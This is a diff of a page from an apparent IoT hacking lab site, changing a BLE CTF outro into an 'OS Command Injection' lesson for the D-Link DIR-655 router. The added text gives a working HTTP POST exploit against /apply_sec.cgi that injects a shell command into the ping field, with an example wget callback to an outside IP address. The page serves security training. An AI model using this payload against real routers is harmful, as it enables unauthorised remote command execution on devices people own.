@@ -5,7 +5,7 @@
 <meta name=generator content="Hugo 0.88.1">
 <meta name=description content>
 <link rel=icon href=/images/favicon.png type=image/png>
-<title>Outro :: IoT Hack Labs</title>
+<title>OS Command Injection :: IoT Hack Labs</title>
 <link href=/css/nucleus.css?1634615416 rel=stylesheet>
 <link href=/css/fontawesome-all.min.css?1634615416 rel=stylesheet>
 <link href=/css/hybrid.css?1634615416 rel=stylesheet>
@@ -20,7 +20,7 @@
 <script src=/js/jquery-3.3.1.min.js?1634615416></script>
 <style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
 </head>
-<body data-url=/btle-ctf/99-outro/>
+<body data-url=/router-lab/dir-655/os-command-injection/>
 <nav id=sidebar>
 <div id=header-wrapper>
 <div id=header>
@@ -76,17 +76,19 @@ Test Remote Connection
 </li>
 </ul>
 </li>
-<li data-nav-id=/router-lab/ title="Router Lab" class=dd-item>
+<li data-nav-id=/router-lab/ title="Router Lab" class="dd-item
+parent">
 <a href=/router-lab/>
 Router Lab
 </a>
 <ul>
-<li data-nav-id=/router-lab/dir-655/ title=DIR-655 class=dd-item>
+<li data-nav-id=/router-lab/dir-655/ title=DIR-655 class="dd-item
+parent">
 <a href=/router-lab/dir-655/>
 DIR-655
 </a>
 <ul>
-<li data-nav-id=/router-lab/dir-655/os-command-injection/ title="OS Command Injection" class=dd-item>
+<li data-nav-id=/router-lab/dir-655/os-command-injection/ title="OS Command Injection" class="dd-item active">
 <a href=/router-lab/dir-655/os-command-injection/>
 OS Command Injection
 </a>
@@ -178,8 +180,7 @@ References
 </li>
 </ul>
 </li>
-<li data-nav-id=/btle-ctf/ title="BTLE CTF" class="dd-item
-parent">
+<li data-nav-id=/btle-ctf/ title="BTLE CTF" class=dd-item>
 <a href=/btle-ctf/>
 BTLE CTF
 </a>
@@ -189,7 +190,7 @@ BTLE CTF
 Intro
 </a>
 </li>
-<li data-nav-id=/btle-ctf/99-outro/ title=Outro class="dd-item active">
+<li data-nav-id=/btle-ctf/99-outro/ title=Outro class=dd-item>
 <a href=/btle-ctf/99-outro/>
 Outro
 </a>
@@ -207,7 +208,7 @@ Outro
 <div>
 <div id=top-bar>
 <div id=top-github-link>
-<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/BTLE%20CTF/99-outro.md target=blank>
+<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/Router%20Lab/DIR-655/OS-Command-Injection.md target=blank>
 <i class="fas fa-code-branch"></i>
 <span id=top-github-link-text>Edit this page</span>
 </a>
@@ -220,18 +221,14 @@ Outro
 </span>
 <span id=toc-menu><i class="fas fa-list-alt"></i></span>
 <span class=links>
-<a href=/></a> > <a href=/btle-ctf/>BTLE CTF</a> > Outro
+<a href=/></a> > <a href=/router-lab/>Router Lab</a> > <a href=/router-lab/dir-655/>DIR-655</a> > OS Command Injection
 </span>
 </div>
 <div class=progress>
 <div class=wrapper>
 <nav id=TableOfContents>
 <ul>
-<li><a href=#finishing-up>Finishing up</a>
-<ul>
-<li><a href=#references>References</a></li>
-</ul>
-</li>
+<li><a href=#os-command-injection>OS Command Injection</a></li>
 </ul>
 </nav>
 </div>
@@ -242,24 +239,32 @@ Outro
 </div>
 <div id=body-inner>
 <h1>
-Outro
+OS Command Injection
 </h1>
-<h2 id=finishing-up>Finishing up</h2>
-<p>Thats it for this lab. You are welcome to continue to try the other challenges.
-If you are done, reset the CTF by writing <code>0xC1EA12</code> to handle <code>0x0032</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0032 -n C1EA12
-</code></pre></div><h3 id=references>References</h3>
-<ul>
-<li><a href=https://github.com/hackgnar/ble_ctf_infinity>https://github.com/hackgnar/ble_ctf_infinity</a></li>
-<li>Chapter 11 of Practical IoT Hacking from No Starch Press.</li>
-</ul>
+<h2 id=os-command-injection>OS Command Injection</h2>
+<p>Make an HTTP POST request to the router, replacing &ldquo;{URL_ENCODED_CMD}&rdquo; with the desired command to run on the router like <code>wget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)</code></p>
+<pre tabindex=0><code>POST /apply_sec.cgi HTTP/1.1
+Host: 192.168.232.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 131
+Connection: close
+Referer: http://192.168.232.128/login_pic.asp
+Cookie: uid=1234123
+Upgrade-Insecure-Requests: 1
+html_response_page=login_pic.asp&amp;action=ping_test&amp;ping_ipaddr=127.0.0.1%0a{URL_ENCODED_CMD}
+
+</code></pre>
 <footer class=footline>
 </footer>
 </div>
 </div>
 <div id=navigation>
-<a class="nav nav-prev" href=/btle-ctf/01-intro/ title=Intro> <i class="fa fa-chevron-left"></i></a>
-<a class="nav nav-next" href=/btle-ctf/01-intro/ title=Intro style=margin-right:0><i class="fa fa-chevron-right"></i></a>
+<a class="nav nav-prev" href=/router-lab/dir-655/ title=DIR-655> <i class="fa fa-chevron-left"></i></a>
+<a class="nav nav-next" href=/router-lab/dir-655/references/ title=References style=margin-right:0><i class="fa fa-chevron-right"></i></a>
 </div>
 </section>
 <div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
